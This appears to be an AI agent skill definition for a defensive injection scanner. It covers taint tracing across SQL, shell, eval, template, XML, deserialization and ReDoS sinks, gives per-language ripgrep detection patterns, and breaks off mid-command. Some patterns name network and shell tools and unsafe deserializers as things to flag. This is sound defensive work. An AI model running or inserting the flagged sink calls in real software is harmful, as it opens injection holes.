---
name: injection-scan
description: Source-to-sink taint trace for every interpreter sink — SQL/NoSQL, OS command, code eval, template (SSTI), XML (XXE), LDAP/XPath, header/log injection, unsafe deserialization, prototype pollution, ReDoS, CSV/spreadsheet formula injection. Every finding cites the sink, the tainted source and the fix.
kind: skill
pack: security
allowed-tools: [Read, Grep, Glob, Bash]
---

# Skill: injection-scan

## Premise

Injection is one bug in fifteen costumes: data an attacker controls crosses into an interpreter — a SQL engine, a shell, an `eval`, a template engine, an XML parser, a deserializer, the JS object model, a regex engine, a spreadsheet's formula engine — and is read as **code instead of data**. OWASP files most of it under **A05:2025 Injection**, deserialization and prototype pollution under **A08:2025 Software or Data Integrity Failures**, and ReDoS under **A10:2025 Mishandling of Exceptional Conditions** (resource exhaustion) — the placement `@security-auditor` already uses. This skill is the executor behind those rows: the A05 depth pass minus XSS, plus A08 deserialization, as `/security-audit` dispatches it.

**Every finding cites the sink at `<file:line>` + the tainted source it traces back to + the concrete fix.** A grep hit is never a finding by itself, and "no injection found" is never printed without the class-coverage block (§ Output) that proves where the run looked.

## The taint rule

A sink is a finding when a **tainted value reaches it without passing a breaker**. Trace backwards from the sink — through assignments, helper calls, services and module boundaries — until you reach a source or a constant.

**Sources — tainted until proven otherwise:**
- **The HTTP request** — body, query string, path params, headers (`Host`, `X-Forwarded-*`, `User-Agent`, `Referer` included), cookies, multipart fields, uploaded files (content *and* filename, MIME type, archive entry names, image/document metadata).
- **Asynchronous input** — message-queue and job payloads (SQS, Kafka, RabbitMQ, Pub/Sub, Celery, Sidekiq, BullMQ), webhook bodies (**a valid signature proves who sent it, not that the content is safe**), inbound email, WebSocket frames.
- **Stored user data (second-order)** — a value stored safely yesterday and concatenated today: a display name, a saved filter, a report definition, a rule row a rules engine evaluates. Trace the column to whoever writes it; a user-writable column is a source.
- **Other systems** — third-party API responses, files in user-writable storage, CSV/XLSX imports.
- **LLM output** — completions and tool-call arguments are attacker-steerable through prompt injection. Model text reaching any sink below is a finding here, at the sink; the output-handling judgment belongs to `@llm-security-reviewer` § "LLM10 Improper Output Handling" — hand the chain there. When `llm-trust-scan` ran first, its `completion-sources.txt` (§3s, `<file:line>` of every completion, tool-call argument and model message read) is a source list: trace each one forward to this skill's sinks, and grade the sink here (OH-3/OH-4, SQL, shell and eval sinks); `llm-trust-scan` lists the count only.

**Breakers — the only things that end the taint:**
- The interpreter's **data channel**: bind parameters, an argv array with no shell, a safe loader, a hardened parser, a fixed template rendered with the value as *context*.
- A **closed type**: parsed to an integer / UUID / boolean / date with failure rejected, or schema-validated to an `enum`.
- An **allow-list map** to a server-side constant: `({ name: 'u.name', created: 'u.created_at' })[input] ?? 'u.id'`.

**Not breakers:** escaping or quoting helpers (`mysql_real_escape_string`, `addslashes`, `replace("'", "''")`, `escapeshellarg`, `shlex.quote`), deny-lists and regex strips (`replace(/;|--/g, '')`), a WAF, client-side validation, a validator that checks presence/length/`IsString` only, and "we use an ORM" — every ORM in the lane table has a raw escape hatch.

**Escaping is not the fix.** It is context-bound (a quoted literal, a number, an identifier, a `LIKE` pattern and a shell word each need different rules — and a numeric or identifier position has no quotes to escape), charset-bound (multibyte bypasses of `addslashes`), and survives only as long as every future edit keeps the call. Shell quoting stops metacharacters but not argument injection (§5). An escaped sink is still reported — one severity step lower, tagged `[report-flagged]` (the unproven link is whether the escape holds in this context), with the binding / argv / allow-list fix. The one exception is §9: LDAP has no bind API, so the library's filter encoder *is* the data channel.

## Boundaries

This skill does not re-derive classes another skill owns; it cross-links them:
- **Mass assignment / over-posting** (CWE-915) — `@api-security-reviewer` § "API3 — Broken Object Property Level Authorization (BOPLA)". Here only when the same request keys reach a SQL identifier position (§2) or a deep merge (§12).
- **XSS and every browser sink** → `xss-scan`. **SSRF and open redirect** (the `Location` header's target) → `ssrf-scan`. **Path traversal, zip-slip, upload handling** → `file-access-scan`. **A vulnerable library version** (Log4j, lodash, ejs, SnakeYAML) → `deps-audit`. **Secrets / PII written to logs** (CWE-532) → `data-exposure-scan`.

## Adapt to the codebase

Detect the lanes from the manifests (`package.json`, `pyproject.toml` / `requirements*.txt`, `go.mod`, `pom.xml` / `build.gradle*`, `Gemfile`, `composer.json`, `*.csproj`) and the pre-flight lane count, run the matching rows, and **print the lanes you ran** in the output header. Read the ORM and driver off the dependency list before applying a row — the escape hatches are per library, and a row applied to the wrong ORM greps for calls the code never makes.

| Lane | SQL escape hatches | Process / eval / template sinks | Parser / deserializer sinks | Safe primitive the fix names |
|---|---|---|---|---|
| **Node / TS** (Express, NestJS, Fastify) | `$queryRawUnsafe`, `Prisma.raw`, `sequelize.query` / `literal`, `knex.raw` / `*Raw`, TypeORM `query()` and QB `` .where(`${}`) ``, MikroORM `em.execute` / `getConnection().execute` / `raw()` / QB `.where(string)`, `sql.raw` / `sql.unsafe` | `child_process.exec*`, `shell: true`, `eval`, `new Function`, `vm`, Handlebars / EJS / Pug / Nunjucks / `_.template` | `libxmljs` `noent`, `node-serialize`, `_.merge` / `_.set` | tagged templates (`` sql`…` ``, `` prisma.$queryRaw`…` ``), `$1` / `?` + values, `execFile` / `spawn` argv |
| **Python** (Django, FastAPI, Flask) | `objects.raw`, `.extra`, `RawSQL`, `cursor.execute(f"…")`, SQLAlchemy `text(f"…")` | `shell=True`, `os.system` / `popen`, `eval` / `exec`, `render_template_string`, `jinja2.Template(user)` | `pickle`, `yaml.load`, `marshal`, `lxml` `resolve_entities` | `execute(sql, params)`, `text(":x")` + params, `subprocess.run([...])`, `yaml.safe_load`, `defusedxml` |
| **Go** | `db.Query(fmt.Sprintf…)`, GORM `.Where` / `.Order` / `.Raw` with concat | `exec.Command("sh", "-c", …)`, `text/template` `.Parse(user)` | rarely any — `encoding/xml` resolves no external entities; `encoding/json` / `gob` build no arbitrary types | `db.Query(q, args...)`, `exec.Command(bin, args...)` |
| **Java / Kotlin** (Spring) | JPA `createQuery` / `createNativeQuery` concat, `JdbcTemplate` concat, `Statement`, MyBatis `${}` | `Runtime.exec`, `ProcessBuilder`, SpEL / OGNL / MVEL, Velocity / FreeMarker / Thymeleaf | `DocumentBuilderFactory` & co, `ObjectInputStream`, `XStream`, Jackson default typing | `PreparedStatement`, `:named` params, MyBatis `#{}`, `ProcessBuilder(List)`, `ObjectInputFilter` |
| **Ruby / Rails** | `where("…#{}")`, `order(params[…])`, `find_by_sql`, `Arel.sql`, `connection.execute` | backticks, `%x`, `system(string)`, `eval`, `send`, `constantize`, `ERB.new`, `render inline:` | `Marshal.load`, `YAML.unsafe_load`, Nokogiri `noent` | `where(col: v)`, `where("a = ?", v)`, `system(bin, *args)` |
| **PHP / Laravel** | `DB::raw` / `select` / `statement`, `*Raw()`, `orderBy($request…)`, `$pdo->query("…$x")` | `exec` / `system` / `shell_exec` / `passthru` / `proc_open`, backticks, `eval`, `assert` | `unserialize`, `LIBXML_NOENT`, Twig `createTemplate` | `?` / `:named` bindings, `proc_open([...])` array form, `json_decode` |
| **.NET** | `FromSqlRaw`, `ExecuteSqlRaw`, `SqlCommand("…" + x)` | `Process.Start("cmd.exe", "/c …")` | `BinaryFormatter`, `TypeNameHandling` ≠ `None`, `DtdProcessing.Parse` | `FromSqlInterpolated`, `SqlParameter`, `ProcessStartInfo.ArgumentList`, `System.Text.Json` |

## Pre-flight greps

Run these first — they produce the candidate set the detectors judge. Grep **N** feeds detector **§N**. Run the block as **one** script from the repo root (shell state does not survive between tool calls, so `X`, `NC` and `SQL` must be defined in the same invocation). Every command names its path (`.`): `rg` given no path searches **stdin** whenever stdin is a pipe — under an agent's shell that is a silent zero-hit run, the false clean this skill exists to prevent. Lane absence comes from the manifests and the lane count the block prints first, **never from a quiet grep**: with an explicit path, ripgrep exits 1 silently when a type filter matches no file — `No files were searched` prints only when rg walks an implicit directory.

```bash
# Not sinks: generated/vendored/static code, tests, migrations, catalogs, docs, prior audit output.
X=(-g '!**/node_modules/**' -g '!**/vendor/**' -g '!**/dist/**' -g '!**/build/**' -g '!**/target/**' -g '!**/.venv/**'
   -g '!**/*.min.*' -g '!**/public/**/*.js' -g '!**/static/**/*.js' -g '!*.{md,mdx,sql,json,snap,lock}' -g '!**/docs/**'
   -g '!**/{test,tests,spec,e2e,__tests__,__mocks__,__snapshots__,__fixtures__,testdata}/**' -g '!**/*{.,_}{test,spec}.*'
   -g '!**/test_*.py' -g '!**/migrations/**' -g '!**/db/migrate/**' -g '!**/{locales,locale,i18n,translations}/**' -g '!/ai/{audits,design}/**')
NC=(rg -v --pcre2 '^[^:]+:\d+:\s*(//|/\*|\*(\s|/|$)|#(?!\{)|<!--)')        # drops comment-only lines; every -n grep ends in it
SQL='(?i:\bselect\b.{0,120}\bfrom\b|\binsert\s+into\b|\bupdate\s+\S+\s+set\b|\bdelete\s+from\b|\b(order|group)\s+by\b|\bwhere\s+[\w.]+\s*(=|<|>|like\b|in\b))|\b(WHERE|AND|OR|LIMIT|OFFSET|VALUES)\b|\s(=|<>|!=)\s+(?=\x27%?(\$\{|#\{|\{\$))'
for t in js ts py go java kotlin ruby php cs; do printf '%-7s %s\n' "$t" "$(rg --files -t "$t" "${X[@]}" . | wc -l)"; done   # 0 = lane absent

# 1. SQL text built from strings — concat / interpolation after (1a) or a format call before (1b); dynamic SQL inside
#    stored procedures (1c); the raw escape hatch per lane (1d); a JS/TS template holding SQL and ${} on different lines (1e).
rg -n --pcre2 "($SQL)"'.*(\$\{|#\{|\{\$|["\x27\x60]\s*[+.]\s*[\w$(]|["\x27](\s*%\s+|\s+%\s*)[\w(]|["\x27]\s*%\s*\(|\.format\()|\bI?LIKE\s+["\x27]%?(\$\{|#\{|\{\$|["\x27]\s*[+.])' "${X[@]}" . | "${NC[@]}"
rg -n --pcre2 '(\bf["\x27]|\$@?"|\b[Ss]printf\(\s*["\x60]|String\.format\(\s*")'".*($SQL)" "${X[@]}" . | "${NC[@]}"
rg -n --pcre2 -i '\b(execute|exec|sp_executesql|prepare\s+\w+\s+from)\b.*(\|\||\+\s*@|concat\s*\(|format\s*\([^)]*%s)' -g '*.sql' -g '!**/node_modules/**' . | "${NC[@]}"
rg -n --pcre2 '(\$(queryRawUnsafe|executeRawUnsafe)|Prisma\.raw|\bsql\.(raw|unsafe)|\b[sS]equelize\.(query|literal)|\bknex\.raw|\.\w+Raw)\((?!\s*(["\x27][^"\x27]*["\x27]|\x60[^\x60$]*\x60)\s*[,)])|\.(query|where|andWhere|orWhere|having|orderBy|addOrderBy|groupBy|select|addSelect)\(\s*(\x60[^\x60]*\$\{|["\x27][^"\x27]*["\x27]\s*\+)' -t js -t ts "${X[@]}" . | "${NC[@]}"
rg -n -U --pcre2 '(\b(em|orm|knex|trx|tx|conn|connection|driver|entityManager|manager)|getConnection\([^)]*\)|getKnex\(\))\s*\.\s*(execute|raw)\s*(<[^()]*>)?\((?!\s*\)|\s*("[^"\n]*"|\x27[^\x27\n]*\x27|\x60[^\x60$]*\x60)\s*[,)])|(?<![.\w$])raw\((?!\s*\)|\s*("[^"\n]*"|\x27[^\x27\n]*\x27|\x60[^\x60$]*\x60)\s*[,)]|\s*\(?\s*(?<a>\w+)\s*\)?\s*=>\s*\x60(?:[^\x60$]|\$(?!\{)|\$\{\s*\k<a>\s*\})*\x60)' -t js -t ts "${X[@]}" . | "${NC[@]}"   # MikroORM / knex
rg -n --pcre2 '\bobjects\.raw\(|\.extra\(\s*(select|where|tables|order_by)\s*=|\bRawSQL\(|(?<![.\w])(text|literal_column)\(\s*(f["\x27]|\w+\s*[,)]|["\x27][^"\x27]*["\x27]\s*[%+])|\.execute(many)?\(\s*(f["\x27]|\w+\s*[,)]|["\x27][^"\x27]*["\x27]\s*(%|\+|\.format))' -t py "${X[@]}" . | "${NC[@]}"
rg -n --pcre2 '\.(Query|QueryRow|QueryContext|QueryRowContext|Exec|ExecContext|Raw|Where|Order|Group|Having|Joins|Select)\(\s*(ctx,\s*)?(fmt\.Sprintf|"[^"]*"\s*\+|[a-z]\w*\s*[)+])' -t go "${X[@]}" . | "${NC[@]}"
rg -n --pcre2 '\b(createNativeQuery|createQuery|createSQLQuery|sqlRestriction|executeQuery|executeUpdate|addBatch|prepareStatement|query|queryForObject|queryForList|queryForMap|update|batchUpdate)\(\s*("[^"]*"\s*\+|[a-z]\w*\s*[)+,]|String\.format)|\bcreateStatement\(\)|@(Select|Update|Insert|Delete)\([^)]*\$\{' -t java -t kotlin "${X[@]}" . | "${NC[@]}"
rg -n '\$\{' -g '*[Mm]apper*.xml' "${X[@]}" . | "${NC[@]}"                 # MyBatis ${} is spliced, #{} is bound
rg -n --pcre2 '\.(where|order|reorder|group|having|joins|select|pluck|from|lock|find_by_sql|exists\?|update_all|delete_all|calculate)\(\s*("[^"]*#\{|params\[|params\.)|\bfind_by_sql\(|\bArel\.sql\(|\bconnection\.(execute|exec_query|select_all|select_value|select_rows)\(' -t ruby "${X[@]}" . | "${NC[@]}"
rg -n --pcre2 '(DB::(raw|select|statement|unprepared)|->\w+Raw)\((?!\s*["\x27][^"\x27$]*["\x27]\s*[,)])|->(orderBy|groupBy|where|select|having)\(\s*\$request|->(query|exec|prepare)\(\s*("[^"]*\$|\$\w+\s*\.|["\x27][^"\x27]*["\x27]\s*\.)|\bmysqli?_query\(' -t php "${X[@]}" . | "${NC[@]}"
rg -n --pcre2 '\b(FromSqlRaw|ExecuteSqlRaw|ExecuteSqlRawAsync|SqlQueryRaw)\(|new\s+\w*Command\(\s*(\$"|"[^"]*"\s*\+)|\.CommandText\s*=\s*(\$"|"[^"]*"\s*\+)' -t cs "${X[@]}" . | "${NC[@]}"
rg -n -U --pcre2 '(?<![\w$])(?<![\w\]]>)\x60(?=[^\x60]*\$\{)(?=[^\x60]*?(?i:\bselect\b[^\x60]{0,400}?\bfrom\b|\binsert\s+into\b|\bupdate\s+["\w.]+\s+set\b|\bdelete\s+from\b|\b(order|group)\s+by\b|\bwhere\s+[\w."]+\s*(=|<|>|like\b|in\b|is\b)))' -t js -t ts "${X[@]}" . | "${NC[@]}"

# 2. Identifiers from input (2a); an identifier interpolated beside a bound placeholder or after a SQL keyword (2b);
#    a migration runner reachable outside the CLI, which puts the excluded migrations back in scope (2c).
#    2a reads the field through an accessor (`.sort`, `['sort']`, `[:sort]`, `('sort')`, `.get('sort')`), never across
#    `params: [order.id…]` or `request.body = fields`; browser code builds query strings, not SQL, so it is left out.
rg -n --pcre2 '(?i)(\b(req|request)\.(query|body|params|args|GET|POST|query_params|data|form)|\bparams|\$request->(input|get|query)|\$_(GET|POST|REQUEST)|getParameter|\bc\.(Query|Param)|Query\(\)\.Get|searchParams)(\??\.(get\(\s*["\x27])?|\[\s*["\x27:]|\(\s*["\x27]|->)(sort|sort_?by|order|order_?by|dir|direction|column|col|field|fields|table|table_?name|group_?by)\b' "${X[@]}" -g '!**/*.{tsx,jsx,vue,svelte}' -g '!**/{web,frontend,client}/src/**' . | "${NC[@]}"
rg -n --pcre2 '(\$\{\w+\}|\{\w+\}|#\{\w+\}|["\x27]\s*\+\s*\w+\s*\+\s*["\x27])\s*(=|<|>|(?i:like|in))\s*(\$\d|\$\$\{|\?|%s|:\w|@\w)|(?i:order\s+by|group\s+by|\bselect\b[^\n]*\bfrom|\bdelete\s+from|\binsert\s+into|\bjoin|\bupdate|\b(create|alter|drop|truncate|lock)\s+table)\s+["\x27]?\s*(\$\{|\{\w|#\{|%s|["\x27]\s*\+)' "${X[@]}" . | "${NC[@]}"
rg -n --pcre2 '\bgetMigrator\(\)\s*\.\s*(up|down)\(|\bmigrate\.(latest|up)\(|\brunMigrations\(|\bcall_command\(\s*["\x27]migrate|\bcommand\.upgrade\(|\bMigrator\(\)\.(up|run)\(' "${X[@]}" . | "${NC[@]}"

# 3. NoSQL — a request object as a filter, server-side JS operators, user-supplied $regex (3a); decorator-bound
#    parameters a validation pipe never validates (a primitive metatype) and DTO properties that survive whitelist (3b).
rg -n --pcre2 '\$where|\$function|\$accumulator|\bmapReduce\(|(\.|->)(find|findOne|find_one|findOneAndUpdate|findOneAndDelete|updateOne|updateMany|deleteOne|deleteMany|countDocuments|count_documents|aggregate|where)\(\s*(req\.(body|query|params)|request\.(json|get_json\(\)|args|form|data)|params\b|\$_(GET|POST|REQUEST))|\{[^}\n]*:\s*(req\.(body|query|params)|request\.json|params)\b[\w.\[\]"\x27]*\s*[},]' "${X[@]}" . | "${NC[@]}"
rg -n --pcre2 '@(Body|Query)\(\s*["\x27][\w.-]+["\x27]\s*\)\s*\w+\??\s*:\s*(string|number|boolean|any|unknown)\b|@(Allow|IsObject)\(\)' -t ts "${X[@]}" . | "${NC[@]}"

# 4. Shell-interpreted command sinks (4a); shell backticks in Ruby/PHP/sh (4b); a command-line string that
#    interpolates, whatever runs it (4c); files importing a process API — read every call in them (4d).
rg -n --pcre2 '(?<![.\w>:$])(exec|execSync|popen|system|passthru|shell_exec|proc_open|pcntl_exec)\(|\b(child_process|cp)\.(exec|execSync)\(|\bshell\s*[:=]\s*(true|True)\b|\bos\.(system|popen|exec[lv]p?e?)\(|\b(commands|subprocess)\.getoutput\(|Runtime\.getRuntime\(\)\.exec\(|\bspawn\w*\(\s*["\x27](sh|bash|cmd|cmd\.exe|powershell)["\x27]|exec\.Command(Context)?\([^)]*"(sh|bash|cmd|powershell)"|%x[{(\[]|\b(IO\.popen|Open3\.\w+|Kernel\.(system|exec|spawn))\(|\bProcess\.Start\(' "${X[@]}" . | "${NC[@]}"
rg -n --pcre2 '\x60[^\x60\n]*(#\{|\$\w|\$\{)[^\x60\n]*\x60' -t ruby -t php -t sh -g '!*.blade.php' "${X[@]}" . | "${NC[@]}"
rg -n --pcre2 '["\x27\x60](convert|magick|identify|ffmpeg|ffprobe|gs|git|curl|wget|tar|zip|unzip|7z|rm|cp|mv|ls|cat|ping|nslookup|dig|sh|bash|openssl|pdftk|qpdf|wkhtmltopdf|soffice|libreoffice|pandoc|exiftool|mysqldump|pg_dump|psql|mysql|rsync|ssh|scp|chmod|chown|mkdir|find|grep|sed|awk|docker|kubectl)\s[^\n]*?(\$\{|#\{|\{\w*\}|%s|["\x27\x60]\s*[+.]\s*[\w$(])' "${X[@]}" . | "${NC[@]}"
rg -ln --pcre2 '(from\s+|require\(\s*)["\x27](node:)?child_process["\x27]|\b(execa|shelljs|zx)\b["\x27]|^\s*(import\s+subprocess|from\s+subprocess\s+import)|"os/exec"|\bProcessBuilder\b|\bOpen3\b|\bSymfony\\Component\\Process\b' "${X[@]}" .

# 5. Option-parsing binaries spawned with an argv (5a); escaping helpers to read for argument injection (5b).
rg -n --pcre2 '[(=]\s*\[?\s*["\x27](git|hg|svn|ffmpeg|ffprobe|convert|magick|identify|gs|curl|wget|tar|zip|unzip|7z|rsync|ssh|scp|psql|mysql|mysqldump|pg_dump|find|sendmail|grep|openssl|soffice|libreoffice|pandoc|wkhtmltopdf|yt-dlp|youtube-dl)["\x27]\s*,' "${X[@]}" . | "${NC[@]}"
rg -n --pcre2 '\b(escapeshellarg|escapeshellcmd|shlex\.quote|shellescape|Shellwords\.escape)\(' "${X[@]}" . | "${NC[@]}"

# 6. Code evaluation, dynamic code loading, expression languages, reflective dispatch.
rg -n --pcre2 '(?<![.\w>:$])(eval|exec|execfile|compile)\s*\(\s*[^)\s]|(?<![.\w>:$])(require|import)\(\s*(?![)"\x27\x60])[\w$]|\bnew\s+Function\s*\(|\bvm\.(runIn\w+|Script|compileFunction)\b|\bset(Timeout|Interval)\(\s*["\x27\x60]|\b(instance_eval|class_eval|module_eval|instance_exec)\b|\.(send|public_send|__send__)\(\s*params|\b(constantize|safe_constantize|const_get)\b|(?<![.\w>])assert\s*\(\s*\$|\bcreate_function\(|preg_replace\(\s*["\x27]/[^/]*/[a-zA-Z]*e|\b(SpelExpressionParser|parseExpression|ScriptEngineManager|GroovyShell|Ognl\.\w+|MVEL\.\w+|ELProcessor|createValueExpression)\b|\b(getattr|__import__|importlib\.import_module)\(\s*[\w.]+\s*,\s*[^,)\n]*\b(request|params|args|data)\b' "${X[@]}" . | "${NC[@]}"

# 7. A template compiled from a string (7a); Spring view names built from input + Thymeleaf preprocessing (7b);
#    hand-rolled {{var}} substitution through String.replace with a string replacement (7c). 7a's last filter drops a
#    METHOD named template / createTemplate (its declaration line); `createTemplate(` counts only on an engine object.
rg -n --pcre2 '\brender_template_string\(|(?<![.\w])[Tt]emplate\(\s*(?!["\x27])\w|\.from_string\(|\b(Handlebars|handlebars|hbs|Mustache|mustache|ejs|pug|jade|nunjucks|swig|doT|_|lodash)\.(compile|render|renderString|template)\((?!\s*["\x27])|\bres\.render\(\s*["\x27][^"\x27]+["\x27]\s*,\s*req\.(query|body|params)\b|\b\w*([Ee]ngine|[Gg]roovy|[Vv]elocity|[Ff]reemarker|[Cc]fg|[Cc]onfiguration)\w*(\(\))?\.(createTemplate|getTemplate)\(|\bVelocity(Engine)?\b.*\.evaluate\(|\bnew\s+Template\([^)]*StringReader|\bERB\.new\(|\bLiquid::Template\.parse\(|\brender\s*\(?\s*inline:|\btemplate\.New\([^)]*\)\.Parse\(|\bBlade::render\(' "${X[@]}" . | "${NC[@]}" \
  | rg -v --pcre2 '^[^:]+:\d+:\s*((export|public|private|protected|static|async|override|abstract|readonly|def|function)\s+)*\w*[Tt]emplate\s*\([^)]*\)?\s*(:\s*[\w<>\[\], |]+)?\s*[{;]?\s*$|^[^:]+:\d+:\s*((export|public|private|protected|static|async|override|abstract|readonly)\s+)*\w*[Tt]emplate\s*\(\s*$'
rg -n --pcre2 '\breturn\s+"[^"]*"\s*\+\s*\w' -g '*Controller.java' -g '*Controller.kt' "${X[@]}" . | "${NC[@]}"; rg -n '__\$\{' -t html "${X[@]}" . | "${NC[@]}"
rg -n --pcre2 '\.replace(All)?\(\s*/[^/\n]*\\?\{\\?\{[^/\n]*/[gimsuy]*\s*,\s*(?!\(|function\b|async\b|\w+\s*=>|["\x27\x60][^"\x27\x60$]*["\x27\x60]\s*\))' -t js -t ts "${X[@]}" . | "${NC[@]}"

# 8. XML parsers (8a), entity-enabling flags (8b), files that harden a parser (8c).
#    8a minus 8c is the "parser with unsafe defaults" set; any 8b hit is a candidate on its own.
rg -n --pcre2 '\b(DocumentBuilderFactory|SAXParserFactory|XMLInputFactory|TransformerFactory|SchemaFactory|SAXReader|SAXBuilder|XMLReaderFactory|XMLDecoder|Unmarshaller)\b|\betree\.(XMLParser|parse|fromstring|XML)\(|\bxml\.(dom|sax)\b|\blibxmljs\b|\bparseXml(String)?\(|\bsimplexml_load_(string|file)\(|->loadXML\(|\b(XmlDocument|XmlReaderSettings|XmlTextReader)\b|\bNokogiri::XML\b|\bREXML::Document\b|\bLibXML::XML\b|\b(node-saml|passport-saml|python3-saml|pysaml2|ruby-saml|php-saml|opensaml)\b' "${X[@]}" . | "${NC[@]}"
rg -n --pcre2 '\bresolve_entities\s*=\s*True|\bno_network\s*=\s*False|\bnoent\s*:\s*true|\bLIBXML_(NOENT|DTDLOAD)\b|\bDtdProcessing\.Parse\b|\.(noent|dtdload)\b|\bXmlResolver\s*=\s*new' "${X[@]}" . | "${NC[@]}"
rg -ln --pcre2 'disallow-doctype-decl|external-(general|parameter)-entities|FEATURE_SECURE_PROCESSING|ACCESS_EXTERNAL_(DTD|SCHEMA)|setExpandEntityReferences\(false\)|SUPPORT_DTD|defusedxml|resolve_entities\s*=\s*False|DtdProcessing\.Prohibit|XmlResolver\s*=\s*null' "${X[@]}" .

# 9. LDAP filters and XPath expressions assembled from strings.
rg -n --pcre2 '\((uid|cn|sAMAccountName|mail|userPrincipalName|memberOf|ou|objectClass|givenName|sn)\s*=[^)\n]*(["\x27]\s*[+.]\s*[\w$]|\$\{|#\{|%s|\{\w*\})|\b(xpath|XPath|selectNodes|selectSingleNode|evaluate|compile)\([^)\n]*(["\x27]\s*[+.]\s*[\w$]|\$\{|#\{|f["\x27]|["\x27]\s*%)' "${X[@]}" . | "${NC[@]}"

# 10. Header / cookie values that are not one constant (10a); log lines that interpolate input (10b).
rg -n --pcre2 '\b(setHeader|addHeader|setCookie|add_header|header|cookie|Header\(\)\.(Set|Add))\(\s*["\x27][\w-]+["\x27]\s*,(?!\s*["\x27][^"\x27$]*["\x27]\s*[,)])|\bheader\(\s*["\x27][^"\x27]*(["\x27]\s*\.|\$)|\.headers\[\s*["\x27][\w-]+["\x27]\s*\]\s*=(?!\s*["\x27][^"\x27]*["\x27]\s*;?\s*$)' "${X[@]}" . | "${NC[@]}"
rg -n --pcre2 '\b(log|logger|logging|console|Log|LOG|[A-Z]\w*\.logger|slog|winston|pino)(\.|::)(\w+\.)?(info|warn|warning|error|debug|log|trace|fatal|critical|Printf|Println|Info|Warn|Error)\w*\s*\(?[^\n]*(\$\{|#\{|["\x27]\s*[+.]\s*[\w$]|["\x27]\s*%\s*[\w(]|\bf["\x27]|%s|\{\})[^\n]*\b(req|request|params|body|query|headers|form|getParameter|FormValue|username|user_?agent|email|\$_(GET|POST))\b' "${X[@]}" . | "${NC[@]}"

# 11. Deserializers that rebuild arbitrary types.
rg -n --pcre2 '\b(pickle|cPickle|_pickle|dill|jsonpickle|shelve|marshal)\.(loads?|Unpickler|decode|open)\b|\bjoblib\.load\(|\bpd\.read_pickle\(|\btorch\.load\(|allow_pickle\s*=\s*True|\byaml\.(load|load_all|unsafe_load|full_load)\(|\bYAML\.(load|unsafe_load|load_file)\b|\bPsych\.unsafe_load\b|\bMarshal\.load\b|\bObjectInputStream\b|\bXMLDecoder\b|\bXStream\b|\b(enableDefaultTyping|activateDefaultTyping)\(|JsonTypeInfo\.Id\.(CLASS|MINIMAL_CLASS)|\bnew\s+Yaml\(\s*\)|(?<![.\w])unserialize\(|\bnode-serialize\b|\bserialize\.unserialize\(|\b(BinaryFormatter|NetDataContractSerializer|LosFormatter|SoapFormatter|ObjectStateFormatter)\b|TypeNameHandling\.(All|Auto|Objects|Arrays)|\bphar://' "${X[@]}" . | "${NC[@]}"

# 12. Deep merge / path-set of request JSON (12a); hand-written recursive merges to read (12b) — lower-case, non-hook names.
rg -n --pcre2 '\b(_|lodash)\.(merge|mergeWith|defaultsDeep|set|setWith|zipObjectDeep)\(|\b(deepmerge|deepMerge|deep_merge|mergeDeep|deepExtend|extendDeep|assignDeep|setPath|dset|unflatten)\(|\b(dotProp|objectPath|dot)\.set\(|\$\.extend\(\s*true|\bObject\.assign\(\s*[\w{}]+\s*,[^)\n]*\b(req\.(body|query)|JSON\.parse)|\w+\[\s*[\w.]{3,}\s*\]\[\s*[\w.]{3,}\s*\]\s*=(?!=)' -t js -t ts "${X[@]}" . | "${NC[@]}"
rg -n --pcre2 '\bfunction\s+(?![A-Z]|use[A-Z])\w*([mM]erge|[eE]xtend|[cC]lone|[dD]eepAssign|[aA]ssign(Deep|In|With)\b)\w*\s*\(|\bfunction\s+assign\s*\(|^\s*((private|public|protected|static|async)\s+)*\w*([mM]erge|[eE]xtend|[cC]lone)\w*\s*\([^)]*\)\s*(:[^{=]*)?\{|function\s+(set|setPath|setValue|setIn|setDeep)\s*\(|\b(const|let)\s+\w*(merge|Merge|extend|Extend)\w*\s*=\s*(async\s*)?\(' -t js -t ts "${X[@]}" . | "${NC[@]}"

# 13. Regex built from input, incl. an implicit compile by .match/.matchAll (13a); nested quantifiers (13b); every
#     constant JS/TS regex through recheck, which also finds polynomial ReDoS (13c). Go/RE2 engines are linear.
#     13c needs recheck@4 already installed (the audit never installs it). Absent, it prints NOT-RUN and a heuristic over the same extract instead:
#     adjacent quantifiers and two `.*` — a read list, never a verdict; the class is `partial` in the coverage block.
rg -n --pcre2 '\bnew\s+RegExp\((?!\s*["\x27/])|(?<![.\w])RegExp\(\s*(?!["\x27/])\w|\bre\.(compile|match|search|fullmatch|sub|subn|findall|finditer|split)\(\s*(?![rbuf]*["\x27])\w|\bnew\s+Regex\(\s*(?!@?")\w|\bRegex\.(Match|IsMatch|Replace|Matches)\(\s*\w+\s*,\s*(?!@?")\w|\bPattern\.(compile|matches)\(\s*(?!")\w|\bRegexp\.new\((?!\s*["\x27/])|\bpreg_\w+\(\s*["\x27][^"\x27]*["\x27]\s*\.\s*\$|\$regex|\.(match|matchAll)\(\s*(?![/"\x27\x60)]|[A-Z][A-Z0-9_]*\b|new\s+RegExp)[\w$.]+\s*\)' "${X[@]}" . | "${NC[@]}"
rg -n --pcre2 '\((?:[^()\n\\]|\\.)*[+*](?:[^()\n\\]|\\.)*\)(?:[+*]|\{\d+,\d*\})' "${X[@]}" . | rg --pcre2 '(RegExp|re\.\w+\(|Pattern\.compile|Regex|Regexp|preg_\w+|=~|\.(match|test|replace|search|split)\(|=\s*/|\(\s*/|\br["\x27])' | "${NC[@]}"
RC="$(mktemp -d "${TMPDIR:-/tmp}/recheck.XXXXXX")"
rg -n -o --no-heading --pcre2 '(?:(?<=[=(,:!&|?{};\[])|(?<=\breturn))\s*/((?![*/\s])(?:\\.|\[(?:\\.|[^\]\\\n])*\]|[^/\\\n\[])+)/([dgimsuyv]*)(?![\w$])' -r $'$1\t$2' -t js -t ts "${X[@]}" . > "$RC/re.tsv"
RT="${REFRACT_RECHECK:-$HOME/.cache/refract/recheck}"   # recheck@4, installed once by the user
[ -d "$RT/node_modules/recheck" ] || { echo "# recheck NOT-RUN (recheck not installed — to enable: npm i --prefix \"$RT\" recheck@4): 13c partial — heuristic candidates:"; rg --pcre2 '^[^\t]*:\d+:.*([+*]\}?[^\t]{0,6}[+*]|\.\*.*\.\*)' "$RC/re.tsv"; } && [ -d "$RT/node_modules/recheck" ] && \
